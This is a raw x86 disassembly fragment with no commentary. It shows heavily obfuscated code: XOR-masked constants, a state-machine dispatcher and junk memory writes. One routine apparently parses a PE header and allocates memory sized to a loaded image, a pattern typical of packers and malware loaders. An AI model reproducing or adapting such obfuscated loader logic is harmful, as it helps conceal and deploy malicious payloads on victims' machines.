  428ecf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ed6:	xor    al,cl
  428ed8:	mov    ecx,DWORD PTR [ebp-0xc]
  428edb:	mov    ecx,DWORD PTR [ecx]
  428edd:	xor    ecx,edi
  428edf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ee6:	or     al,cl
  428ee8:	mov    ecx,DWORD PTR [ebp+0xc]
  428eeb:	mov    ecx,DWORD PTR [ecx]
  428eed:	xor    ecx,edi
  428eef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428ef6:	cmp    cl,al
  428ef8:	jne    0x428f4a
  428efa:	mov    eax,DWORD PTR [ebp-0x14]
  428efd:	mov    eax,DWORD PTR [eax]
  428eff:	xor    eax,edi
  428f01:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f08:	mov    ecx,DWORD PTR [ebp-0xc]
  428f0b:	mov    ecx,DWORD PTR [ecx]
  428f0d:	xor    ecx,edi
  428f0f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f16:	xor    al,cl
  428f18:	mov    ecx,DWORD PTR [ebp-0x10]
  428f1b:	mov    ecx,DWORD PTR [ecx]
  428f1d:	xor    ecx,edi
  428f1f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f26:	or     al,cl
  428f28:	mov    ecx,DWORD PTR [ebp-0x14]
  428f2b:	mov    ecx,DWORD PTR [ecx]
  428f2d:	xor    ecx,edi
  428f2f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f36:	cmp    cl,al
  428f38:	jne    0x428f4a
  428f3a:	lea    eax,[ebp-0x4c]
  428f3d:	push   eax
  428f3e:	call   0x428a05
  428f43:	mov    ecx,DWORD PTR [ebp-0x44]
  428f46:	cmp    eax,ecx
  428f48:	je     0x428f54
  428f4a:	mov    eax,DWORD PTR [ebp+0x8]
  428f4d:	xor    eax,edi
  428f4f:	add    eax,ebx
  428f51:	mov    DWORD PTR [ebp+0x18],eax
  428f54:	mov    eax,DWORD PTR [ebp-0x8]
  428f57:	xor    eax,edi
  428f59:	lea    eax,[eax+esi*1+0x3272f5]
  428f60:	xor    eax,edi
  428f62:	mov    ecx,DWORD PTR [ebp+0x8]
  428f65:	mov    edx,DWORD PTR [ebp+0x18]
  428f68:	xor    ecx,edi
  428f6a:	add    ecx,ebx
  428f6c:	cmp    edx,ecx
  428f6e:	je     0x428d6b
  428f74:	mov    eax,DWORD PTR [ebp+0x8]
  428f77:	mov    ecx,DWORD PTR [ebp+0x18]
  428f7a:	xor    eax,edi
  428f7c:	add    eax,ebx
  428f7e:	cmp    ecx,eax
  428f80:	jne    0x428f93
  428f82:	mov    eax,DWORD PTR [ebp-0x8]
  428f85:	mov    ecx,DWORD PTR [ebp+0x1c]
  428f88:	xor    eax,edi
  428f8a:	lea    eax,[eax+ecx*1+0x3272f5]
  428f91:	jmp    0x42900a
  428f93:	push   0x18
  428f95:	push   DWORD PTR [ebp-0x4]
  428f98:	lea    eax,[ebp-0x64]
  428f9b:	push   eax
  428f9c:	call   0x42827f
  428fa1:	mov    eax,DWORD PTR [ebp+0x8]
  428fa4:	mov    ecx,DWORD PTR [ebp-0x18]
  428fa7:	xor    eax,edi
  428fa9:	add    eax,ebx
  428fab:	cmp    eax,ecx
  428fad:	je     0x428fc2
  428faf:	mov    eax,DWORD PTR [ebp+0x8]
  428fb2:	xor    eax,edi
  428fb4:	add    eax,ebx
  428fb6:	push   eax
  428fb7:	push   0x18
  428fb9:	lea    eax,[ebp-0x64]
  428fbc:	push   eax
  428fbd:	call   0x428865
  428fc2:	mov    eax,DWORD PTR [ebp-0x4]
  428fc5:	add    eax,0x18
  428fc8:	mov    DWORD PTR [ebp+0x18],eax
  428fcb:	push   DWORD PTR [ebp-0x50]
  428fce:	push   DWORD PTR [ebp+0x18]
  428fd1:	mov    eax,DWORD PTR [ebp-0x54]
  428fd4:	add    eax,DWORD PTR [ebp-0x20]
  428fd7:	push   eax
  428fd8:	call   0x42827f
  428fdd:	mov    eax,DWORD PTR [ebp+0x8]
  428fe0:	mov    ecx,DWORD PTR [ebp-0x18]
  428fe3:	xor    eax,edi
  428fe5:	add    eax,ebx
  428fe7:	cmp    eax,ecx
  428fe9:	je     0x428ffc
  428feb:	push   0x0
  428fed:	push   DWORD PTR [ebp-0x50]
  428ff0:	mov    eax,DWORD PTR [ebp-0x54]
  428ff3:	add    eax,DWORD PTR [ebp-0x20]
  428ff6:	push   eax
  428ff7:	call   0x428865
  428ffc:	mov    eax,DWORD PTR [ebp-0x24]
  428fff:	mov    ecx,DWORD PTR [ebp-0x50]
  429002:	add    DWORD PTR [eax],ecx
  429004:	mov    eax,DWORD PTR [ebp-0x50]
  429007:	add    eax,DWORD PTR [ebp+0x1c]
  42900a:	mov    DWORD PTR [ebp+0x1c],eax
  42900d:	mov    eax,DWORD PTR [ebp-0x8]
  429010:	mov    ecx,DWORD PTR [ebp+0x1c]
  429013:	xor    eax,edi
  429015:	add    eax,ebx
  429017:	imul   eax,ecx
  42901a:	mov    ecx,DWORD PTR [ebp+0x8]
  42901d:	mov    edx,DWORD PTR [ebp-0x28]
  429020:	xor    ecx,edi
  429022:	lea    ecx,[ecx+edx*1+0x3272f5]
  429029:	cmp    eax,ecx
  42902b:	jb     0x428c89
  429031:	mov    esi,DWORD PTR [ebp+0x14]
  429034:	mov    eax,DWORD PTR [ebp-0x20]
  429037:	mov    DWORD PTR [esi],eax
  429039:	jmp    0x429080
  42903b:	mov    ecx,DWORD PTR [ebp+0x8]
  42903e:	mov    edx,DWORD PTR [ebp+0xc]
  429041:	xor    ecx,edi
  429043:	xor    edx,edi
  429045:	add    ecx,ebx
  429047:	add    edx,ebx
  429049:	cmp    ecx,edx
  42904b:	jne    0x42905f
  42904d:	mov    eax,ds:0x7f642ddc
  429052:	imul   eax,eax,0x9f15fccf
  429058:	mov    ds:0x7f642ddc,eax
  42905d:	jmp    0x429080
  42905f:	mov    ecx,DWORD PTR [ebp+0x8]
  429062:	xor    ecx,edi
  429064:	add    ecx,ebx
  429066:	cmp    eax,ecx
  429068:	je     0x429076
  42906a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  429074:	jmp    0x429080
  429076:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  429080:	pop    edi
  429081:	pop    esi
  429082:	pop    ebx
  429083:	leave  
  429084:	ret    0x18
  429087:	push   ebp
  429088:	mov    ebp,esp
  42908a:	and    esp,0xfffffff8
  42908d:	mov    eax,DWORD PTR [ebp+0x20]
  429090:	sub    esp,0x14
  429093:	push   ebx
  429094:	mov    ebx,DWORD PTR [ebp+0x14]
  429097:	push   esi
  429098:	push   edi
  429099:	cmp    eax,0xf89c85a5
  42909e:	jne    0x4290aa
  4290a0:	push   0xf89c85a2
  4290a5:	jmp    0x4291dc
  4290aa:	mov    eax,DWORD PTR [ebp+0x20]
  4290ad:	cmp    eax,0xf89c85a2
  4290b2:	jne    0x4290be
  4290b4:	push   0xf89c85a3
  4290b9:	jmp    0x4291dc
  4290be:	mov    eax,DWORD PTR [ebp+0x20]
  4290c1:	cmp    eax,0xf89c85a3
  4290c6:	jne    0x4290d2
  4290c8:	push   0xf89c85a0
  4290cd:	jmp    0x4291dc
  4290d2:	mov    eax,DWORD PTR [ebp+0x20]
  4290d5:	cmp    eax,0xf89c85a0
  4290da:	jne    0x4290e6
  4290dc:	push   0xf89c85a1
  4290e1:	jmp    0x4291dc
  4290e6:	mov    ecx,DWORD PTR [ebp+0x20]
  4290e9:	mov    eax,0xf89c85bc
  4290ee:	cmp    ecx,eax
  4290f0:	jne    0x4291ac
  4290f6:	mov    eax,DWORD PTR [ebp+0x10]
  4290f9:	mov    DWORD PTR [esp+0xc],eax
  4290fd:	mov    eax,DWORD PTR [ebp+0x18]
  429100:	mov    DWORD PTR [esp+0x14],eax
  429104:	mov    eax,DWORD PTR [ebp+0xc]
  429107:	mov    DWORD PTR [esp+0x18],eax
  42910b:	mov    eax,DWORD PTR [ebp+0x8]
  42910e:	mov    DWORD PTR [esp+0x10],eax
  429112:	mov    eax,DWORD PTR [esp+0x10]
  429116:	mov    ecx,DWORD PTR [esp+0x14]
  42911a:	mov    edi,0x75108ae
  42911f:	xor    eax,edi
  429121:	mov    esi,0x3272f5
  429126:	add    eax,esi
  429128:	mov    DWORD PTR [ecx],eax
  42912a:	mov    eax,DWORD PTR [esp+0xc]
  42912e:	mov    eax,DWORD PTR [eax+0x194]
  429134:	mov    ecx,DWORD PTR [eax]
  429136:	mov    eax,DWORD PTR [esp+0xc]
  42913a:	mov    eax,DWORD PTR [eax+0x194]
  429140:	mov    eax,DWORD PTR [eax]
  429142:	add    eax,DWORD PTR [ecx+0x3c]
  429145:	mov    ecx,DWORD PTR [esp+0xc]
  429149:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42914f:	mov    ecx,DWORD PTR [ecx+0x14]
  429152:	push   0x4
  429154:	push   0x3000
  429159:	push   DWORD PTR [eax+0x50]
  42915c:	push   0x0
  42915e:	call   ecx
  429160:	mov    DWORD PTR [ebx],eax
  429162:	mov    eax,DWORD PTR [esp+0x10]
  429166:	push   DWORD PTR [esp+0xc]
  42916a:	xor    eax,edi
  42916c:	add    eax,esi
  42916e:	mov    DWORD PTR [esp+0x20],eax
  429172:	lea    eax,[esp+0x20]
  429176:	push   eax
  429177:	push   ebx
  429178:	push   DWORD PTR [esp+0x20]
  42917c:	push   DWORD PTR [esp+0x28]
  429180:	push   DWORD PTR [esp+0x24]
  429184:	call   0x428b49
  429189:	mov    eax,DWORD PTR [esp+0x10]
  42918d:	mov    ecx,DWORD PTR [ebx]
  42918f:	xor    eax,edi
  429191:	add    eax,esi
  429193:	cmp    ecx,eax
  429195:	je     0x4291f3
  429197:	mov    eax,DWORD PTR [esp+0x18]
  42919b:	mov    ecx,DWORD PTR [esp+0x14]
  42919f:	xor    eax,edi
  4291a1:	add    eax,esi
  4291a3:	imul   eax,DWORD PTR [esp+0x1c]
  4291a8:	mov    DWORD PTR [ecx],eax
  4291aa:	jmp    0x4291f3
  4291ac:	mov    ecx,DWORD PTR [ebp+0x20]
  4291af:	cmp    ecx,0xf89c85a1
  4291b5:	jne    0x4291be
  4291b7:	push   0xf89c85be
  4291bc:	jmp    0x4291dc
  4291be:	mov    ecx,DWORD PTR [ebp+0x20]
  4291c1:	cmp    ecx,0xf89c85be
  4291c7:	jne    0x4291d0
  4291c9:	push   0xf89c85bf
  4291ce:	jmp    0x4291dc
  4291d0:	mov    ecx,DWORD PTR [ebp+0x20]
  4291d3:	cmp    ecx,0xf89c85bf
  4291d9:	jne    0x4291f3
  4291db:	push   eax
  4291dc:	push   DWORD PTR [ebp+0x1c]
  4291df:	push   DWORD PTR [ebp+0x18]
  4291e2:	push   ebx
  4291e3:	push   DWORD PTR [ebp+0x10]
  4291e6:	push   DWORD PTR [ebp+0xc]
  4291e9:	push   DWORD PTR [ebp+0x8]
  4291ec:	call   0x429087
  4291f1:	mov    DWORD PTR [ebx],eax
  4291f3:	mov    eax,DWORD PTR [ebx]
  4291f5:	pop    edi
  4291f6:	pop    esi
  4291f7:	pop    ebx
  4291f8:	mov    esp,ebp
  4291fa:	pop    ebp
  4291fb:	ret    0x1c
  4291fe:	push   ebp
  4291ff:	mov    ebp,esp
  429201:	sub    esp,0xc
  429204:	mov    eax,0xf89c85a5
  429209:	mov    DWORD PTR [ebp-0x8],eax
  42920c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429213:	mov    ecx,DWORD PTR [ebp-0x8]
  429216:	xor    ecx,0x75108ae
  42921c:	add    ecx,0x3272f5
  429222:	mov    DWORD PTR [ebp-0x4],ecx
  429225:	mov    ecx,DWORD PTR [ebp+0xc]
  429228:	push   eax
  429229:	mov    DWORD PTR [ebp+0xc],ecx
  42922c:	push   DWORD PTR [ebp+0xc]
  42922f:	lea    eax,[ebp-0x4]
  429232:	push   DWORD PTR [ebp+0x8]
  429235:	push   eax
  429236:	push   DWORD PTR [ebp+0xc]
  429239:	push   DWORD PTR [ebp-0xc]
  42923c:	push   DWORD PTR [ebp-0x8]
  42923f:	call   0x429087
  429244:	mov    DWORD PTR [ebp-0x4],eax
  429247:	mov    eax,DWORD PTR [ebp-0x4]
  42924a:	leave  
  42924b:	ret    0x8
